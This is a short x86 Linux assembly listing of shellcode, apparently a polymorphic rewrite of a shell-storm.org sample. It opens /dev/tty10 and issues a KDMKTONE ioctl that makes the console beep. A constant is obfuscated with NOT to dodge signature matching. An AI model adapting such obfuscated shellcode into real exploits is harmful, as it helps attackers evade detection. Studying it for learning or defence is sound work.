; http://shell-storm.org/shellcode/files/shellcode-60.php
; original: 45
; poly: 42

global _start

section .text
_start:
   ;     int fd = open("/dev/tty10", O_RDONLY);
   push byte 5
   pop eax
   cdq
   push edx
   push 0x30317974
   push 0x742f2f2f
   push 0x7665642f
   mov ebx, esp
   mov ecx, edx
   int 80h

   ;     ioctl(fd, KDMKTONE (19248), 66729180);
   mov ebx, eax
   push byte 54
   pop eax
   mov ecx, 4294948047
   not ecx
   mov edx, 66729180
   int 80h
